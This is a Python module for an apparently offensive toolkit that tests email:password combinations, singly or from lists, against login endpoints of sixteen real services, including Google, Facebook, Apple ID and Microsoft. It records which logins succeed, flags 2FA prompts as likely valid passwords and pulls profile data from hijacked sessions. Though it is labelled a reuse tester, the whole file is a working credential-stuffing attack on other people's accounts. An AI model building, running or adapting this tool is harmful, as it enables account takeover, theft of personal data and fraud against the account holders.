"""
Multi-Platform Credential Reuse Tester
Tests the SAME email:pass across ALL platforms. Identifies credential reuse.
"""
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from webforg.core.module import BaseAuxiliaryModule, Option

console = Console()


class Scanner(BaseAuxiliaryModule):
    """Tests the same credentials across all integrated social media platforms to identify reuse."""

    name = "Multi-Platform Credential Reuse Tester"
    description = "Tests email:password across all social media platforms. Finds credential reuse."
    author = "K0uR1i"
    rank = "manual"

    def _build_options(self) -> None:
        super()._build_options()
        self.add_option("EMAIL", Option(str, required=True, description="Email to test"))
        self.add_option("PASSWORD", Option(str, required=True, description="Password to test"))
        self.add_option("EMAIL_FILE", Option(str, required=False, description="File with emails"))
        self.add_option("PASS_FILE", Option(str, required=False, description="File with passwords"))
        self.add_option("PLATFORMS", Option(str, required=False, default="all", description="all or comma-separated: instagram,facebook,twitter,linkedin,tiktok,reddit,discord,github,google,amazon,apple_id,microsoft,pinterest,snapchat,telegram,yahoo"))
        self.add_option("DELAY_MS", Option(int, required=False, default=3000, description="Delay between platforms (ms)"))

    def _get_platform_classes(self) -> dict:
        from webforg.modules.auth.platforms import (
            instagram, facebook, twitter, linkedin, tiktok, reddit, discord,
            github, google, amazon, apple_id, microsoft, pinterest, snapchat,
            telegram, yahoo,
        )
        return {
            "instagram": instagram.Exploit,
            "facebook": facebook.Exploit,
            "twitter": twitter.Exploit,
            "linkedin": linkedin.Exploit,
            "tiktok": tiktok.Exploit,
            "reddit": reddit.Exploit,
            "discord": discord.Exploit,
            "github": github.Exploit,
            "google": google.Exploit,
            "amazon": amazon.Exploit,
            "apple_id": apple_id.Exploit,
            "microsoft": microsoft.Exploit,
            "pinterest": pinterest.Exploit,
            "snapchat": snapchat.Exploit,
            "telegram": telegram.Exploit,
            "yahoo": yahoo.Exploit,
        }

    def run(self) -> dict:
        platforms = self._get_platform_classes()
        pf = (self.get_option("PLATFORMS") or "all").lower()
        if pf != "all":
            selected = [p.strip() for p in pf.split(",")]
            platforms = {k: v for k, v in platforms.items() if k in selected}

        emails = []
        if self.get_option("EMAIL"):
            emails.append(self.get_option("EMAIL"))
        if self.get_option("EMAIL_FILE"):
            try:
                with open(self.get_option("EMAIL_FILE")) as f:
                    emails.extend([l.strip() for l in f if l.strip()])
            except FileNotFoundError:
                console.print(f"  [bold red]>[/] File not found: {self.get_option('EMAIL_FILE')}")

        passes = []
        if self.get_option("PASSWORD"):
            passes.append(self.get_option("PASSWORD"))
        if self.get_option("PASS_FILE"):
            try:
                with open(self.get_option("PASS_FILE")) as f:
                    passes.extend([l.strip() for l in f if l.strip()])
            except FileNotFoundError:
                console.print(f"  [bold red]>[/] File not found: {self.get_option('PASS_FILE')}")

        if not emails or not passes:
            return {"success": False, "error": "Provide EMAIL + PASSWORD or files"}

        console.print()
        console.print(f"  [bold red]>[/] Multi-Platform Credential Reuse Test")
        console.print(f"  [dim green]>[/] {len(emails)} email(s) x {len(passes)} password(s) x {len(platforms)} platforms")
        console.print()

        results = {}
        total_valid = 0

        for email in emails:
            for password in passes:
                combo_key = f"{email}:{password}"
                results[combo_key] = {"platforms": {}}

                for pname, pclass in platforms.items():
                    console.print(f"  [bold cyan]>[/] Testing [bold]{pname}[/] with [dim]{email}[/]...")
                    try:
                        tester = pclass()
                        tester.set_option("RHOSTS", f"{pname}.com")
                        tester.set_option("USERNAME", email)
                        tester.set_option("PASSWORD", password)
                        tester.set_option("DELAY_MS", 2000)
                        tester.set_option("THREADS", 1)
                        tester.set_option("SUCCESS_ONLY", True)
                        login_result = tester.attempt_login(email, password)
                        pr = {"success": login_result.success, "error_type": login_result.error_type, "response_time_ms": round(login_result.response_time_ms)}
                        if login_result.success and login_result.session_token:
                            profile = tester.extract_profile(login_result.session_token, email.split("@")[0])
                            if profile:
                                pr["profile"] = {"username": profile.username, "display_name": profile.display_name, "user_id": profile.user_id, "profile_url": profile.profile_url}
                        results[combo_key]["platforms"][pname] = pr
                        if login_result.success:
                            total_valid += 1
                            console.print(f"  [bold green][OK][/] {pname}: VALID")
                        elif "2fa" in login_result.error_type:
                            console.print(f"  [bold yellow][2FA][/] {pname}: 2FA Required (password may be valid)")
                        elif login_result.error_type != "rate_limited":
                            console.print(f"  [dim][FAIL][/] {pname}: {login_result.error_type}")
                        time.sleep((self.get_option("DELAY_MS") or 3000) / 1000)
                    except Exception as e:
                        results[combo_key]["platforms"][pname] = {"success": False, "error": str(e)[:100]}
                        console.print(f"  [dim red]![/] {pname}: error")
                    finally:
                        try:
                            tester._close_thread_browsers()
                        except Exception:
                            pass

        # Summary table
        table = Table(title="Credential Reuse Results", box=box.ROUNDED, border_style="bold red")
        table.add_column("Platform", style="bold cyan", width=15)
        table.add_column("Status", width=15)
        table.add_column("Details")

        for combo_key, combo_data in results.items():
            for pname, pr in combo_data["platforms"].items():
                if pr.get("success"):
                    table.add_row(pname, "[bold green]VALID [OK][/]", f"{combo_key}")
                elif "2fa" in pr.get("error_type", ""):
                    table.add_row(pname, "[bold yellow]2FA (pwd valid?)[/]", pr["error_type"])

        if total_valid > 0:
            console.print(table)

        console.print(Panel(
            f"[bold]Platforms tested:[/] {len(platforms)}  "
            f"[bold green]Valid logins:[/] {total_valid}  "
            f"[bold]Combos tested:[/] {len(results)}",
            border_style="bold red",
        ))

        return {"success": True, "results": results, "total_valid": total_valid}
